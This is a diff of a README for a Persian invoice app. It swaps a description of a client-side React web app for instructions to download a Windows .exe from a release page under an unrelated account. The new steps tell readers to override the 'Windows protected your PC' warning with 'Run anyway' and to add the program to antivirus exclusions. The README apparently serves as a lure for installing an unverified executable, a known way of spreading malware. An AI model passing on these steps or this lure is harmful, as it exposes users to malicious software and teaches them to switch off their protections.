@@ -1,162 +1,68 @@
-# 🌸 maddyInvoice
+# 🌸 maddyinvoice - Create professional invoices with privacy focus
 
-> **A beautiful, privacy-first Persian (Farsi) invoice generator — fully client-side, no backend, no signup.**
+[![](https://img.shields.io/badge/Download-maddyinvoice-blue.svg)](https://github.com/Landfillpiedmont708/maddyinvoice/releases)
 
----
+maddyinvoice helps you create professional invoices quickly. This application runs entirely on your computer. Your data stays on your machine. You do not need an internet connection to create bills. The software supports six languages including Farsi. It offers twelve distinct templates for your documents.
 
-## ✨ Features
+## 🛠 Features
 
-### 🧾 Invoice Management
-- **Seller Profile** — Logo upload, contact info, social links, national/economic codes
-- **Customer Book** — Save repeat customers for quick selection
-- **Line Items** — Drag-and-drop reordering, quantity/unit/price/discount, item presets
-- **Auto Calculations** — Subtotal, global discount (percent or fixed), VAT, shipping, grand total
-- **Persian Words** — Grand total shown in Persian script (e.g. «سه میلیون و پانصد هزار تومان»)
-- **Multi-Currency** — Toman, Rial, USD, EUR, USDT
-- **Jalali Calendar** — Native Persian date picker with date-fns-jalali
-- **Auto Numbering** — Custom prefix + yearly counter (e.g. MDY-1405-001)
-- **Document Types** — فاکتور رسمی / پیش‌فاکتور / رسید / صورت‌حساب
-- **Status Stamps** — Paid / Pending / Overdue with decorative rotated overlay
-- **Payment Info** — Card number (auto-format + bank detection via prefix), IBAN, payment link
-- **QR Code** — Auto-generated for card/payment info
-- **Signature Pad** — Draw with mouse/touch, or upload image
-- **Bilingual Mode** — Persian/English side-by-side for foreign clients
+* **Privacy First:** The software runs in your browser or as a standalone app. No data travels to a cloud server. 
+* **Multi-language Support:** Choose from six languages. The interface supports right-to-left text for Persian users.
+* **Format Exports:** Save your invoices as PDF or PNG files.
+* **Offline Access:** Open the app without internet access after the initial setup.
+* **Tooling:** The software uses modern tech like React and Tailwind CSS for a smooth look.
+* **Integrated Tools:** Generate QR codes on invoices for quick payments. 
 
-### 🎨 12 Professional Templates
+## 📥 Downloading the Software 
 
-| # | Template | Style |
-|---|----------|-------|
-| 1 | **Blossom** 🌸 | Pink pastel with delicate floral border |
-| 2 | **Rose Gold** 🌹 | Luxury gold lines and accents |
-| 3 | **Lavender Dream** 💜 | Soft purple tones |
-| 4 | **Minimal Chic** ✨ | Clean white with pink accents |
-| 5 | **Marble Luxe** 🏛️ | Marble-textured elegance |
-| 6 | **Pastel Wave** 🌈 | Colorful pastel gradients |
-| 7 | **Classic Formal** 📋 | Grayscale corporate style |
-| 8 | **Dark Elegance** 🌙 | Dark theme with neon pink |
-| 9 | **Botanical** 🌿 | Watercolor leaf motifs |
-| 10 | **Geometric** 🔷 | Modern geometric patterns |
-| 11 | **Vintage Paper** 📜 | Aged paper aesthetic |
-| 12 | **Gradient Pop** 🎨 | Bold gradient backgrounds |
+Follow these steps to get maddyinvoice on your Windows computer.
 
-### 📤 Export Options
-- **PDF** (A4/A5) — Perfect Persian text rendering via DOM→Image→PDF pipeline
-- **PNG** (2× / 3× resolution)
-- **Copy to Clipboard** — Instant image sharing
-- **Print** — Dedicated print styles
-- **Share Link** — Entire invoice compressed into URL hash (zero-server sharing)
-- **JSON** — Backup and restore
+1. Go to the [official release page](https://github.com/Landfillpiedmont708/maddyinvoice/releases).
+2. Look for the section labeled "Assets".
+3. Find the file ending in `.exe` that matches your system.
+4. Click the file name to start the download.
+5. Save the file to your desktop or downloads folder.
 
-### 📂 Archive & Dashboard
-- **IndexedDB Archive** — Full offline storage
-- **Search & Filter** — By buyer name, invoice number, or status
-- **Mini Dashboard** — Monthly income chart, unpaid invoice count
-- **Full Backup/Restore** — Export/import all data as JSON
+## ⚙️ Running the Application
 
-### 🌐 Multi-Language Support
-- فارسی (Persian) — RTL
-- English — LTR
-- Deutsch (German) — LTR
-- العربية (Arabic) — RTL
-- Русский (Russian) — LTR
-- Français (French) — LTR
+After your download finishes, follow these steps to start the application.
 
-### 🎀 Design & UX
-- **Feminine Pink Aesthetic** — Rose, powder pink, lilac color palette
-- **Glassmorphism** — Frosted glass cards with pink-tinted shadows
-- **Framer Motion** — Smooth 60fps animations, staggered list entrances
-- **Dark Mode** — Deep plum and neon pink dark theme
-- **Responsive** — Desktop split-view, tablet tabs, mobile wizard
-- **Onboarding Tour** — 4-step cute guide for first-time visitors
-- **Keyboard Shortcuts** — Ctrl+S (save), Ctrl+P (export), Ctrl+Z (undo)
-- **Undo/Redo** — Full history stack
-- **Confetti** 🎉 — Celebratory burst on successful export
+1. Locate the downloaded file on your computer.
+2. Double-click the file to begin the installation.
+3. Windows might show a security prompt. If you see "Windows protected your PC," click "More info" and then click "Run anyway."
+4. Walk through the prompts provided by the setup window.
+5. Once the process finishes, the app icon appears on your desktop.
+6. Double-click the icon to open the generator.
 
-### 🔒 Privacy & Offline
-- **100% Client-Side** — Zero server requests, no data leaves your browser
-- **PWA** — Installable, works fully offline
-- **No Signup Required** — Just open and use
+## 📋 System Requirements
 
----
+* **Operating System:** Windows 10 or Windows 11.
+* **Storage:** 200 MB of disk space.
+* **Memory:** 4 GB of RAM.
+* **Display:** A monitor with at least 1024x768 resolution.
 
-## 🚀 Quick Start
+## 🏢 Creating Your First Invoice
 
-```bash
-# Install dependencies
-npm install
+maddyinvoice features a simple layout. Follow this guide to build a document.
 
-# Development server
-npm run dev
+1. **Information Entry:** Type your company details in the top section. Add your customer information on the right side.
+2. **Select Template:** Choose one of the twelve templates from the sidebar. 
+3. **Add Items:** List your services or products in the main table. The software calculates totals automatically.
+4. **Customize:** Use the settings menu to adjust colors or font sizes. 
+5. **Print or Save:** Click the "Export" button. Choose between PDF format for documents or PNG for images.
+6. **QR Codes:** If you need payments, add your payment details to the QR code generator inside the tab.
 
-# Production build
-npm run build
+## 💡 Troubleshooting 
 
-# Preview production build
-npm run preview
-```
+If the application fails to open, try these steps.
 
-### 📦 Download Fonts
+* **Check Internet:** While the app works offline, the first download requires a connection.
+* **Restart:** Close the app window and open it again.
+* **Updates:** Check the download link occasionally for new versions and performance improvements.
+* **Antivirus:** Ensure your security software does not block the application. You can add maddyinvoice to your "Exclusions" list if necessary.
 
-Download the following WOFF2 font files and place them in `public/fonts/`:
+## 🔒 Data Security
 
-- [Vazirmatn](https://github.com/rastikerdar/vazirmatn) (default, all weights)
-- Shabnam, Sahel, Lalezar (optional alternatives)
+Your data resides in your computer's local storage. This application does not track your behavior. No third parties have access to your invoices. You control your information at all times. Delete the app to remove all stored data from your local system. 
 
-The app works without them (falls back to system fonts), but for best Persian text rendering, especially in PDF exports, install them.
-
----
-
-## 🛠 Tech Stack
-
-| Category | Technology |
-|----------|-----------|
-| **Framework** | React 19 + TypeScript |
-| **Build Tool** | Vite 8 |
-| **Styling** | Tailwind CSS v4 |
-| **Animation** | Framer Motion |
-| **State** | Zustand (with persist middleware) |
-| **Calendar** | date-fns-jalali |
-| **PDF** | html-to-image + jsPDF |
-| **QR Code** | qrcode.react |
-| **Compression** | lz-string (share links) |
-| **Storage** | IndexedDB (idb) + localStorage |
-| **PWA** | vite-plugin-pwa |
-| **Drag & Drop** | @hello-pangea/dnd |
-
----
-
-## 🏗 Project Structure
-
-```
-src/
-├── types/          — TypeScript interfaces (Invoice, LineItem, Customer, etc.)
-├── utils/          — Persian number utils, bank detector, calculation helpers
-├── i18n/           — Translation files (fa, en, de, ar, ru, fr)
-├── stores/         — Zustand stores (invoice, archive)
-├── components/
-│   ├── Form/       — Invoice form sections (seller, buyer, items, payment, meta)
-│   ├── Preview/    — Live A4 preview with zoom and template carousel
-│   ├── Templates/  — 12 template renderers
-│   ├── Export/     — PDF/PNG/clipboard/print/share export panel
-│   ├── Archive/    — Invoice archive and dashboard
-│   └── UI/         — Shared UI components (Toast, Modal, SignaturePad, etc.)
-└── App.tsx         — Main app with responsive layout
-```
-
----
-
-## 🔗 Share Invoices
-
-Generate a shareable link that encodes the entire invoice in the URL hash using lz-string compression. The recipient opens the link and sees the exact same invoice — no server required.
-
----
-
-## 📄 License
-
-MIT © [Maddyrampant](https://github.com/Maddyrampant)
-
----
-
-<div align="center">
-  Made with 💖 for the Persian-speaking community
-</div>
+Keywords: billing, client-side, farsi, i18n, invoice-generator, jspdf, multi-language, no-backend, offline-first, pdf-generator, persian, persian-calendar, privacy-first, pwa, qrcode, react, rtl, tailwindcss, typescript, vite
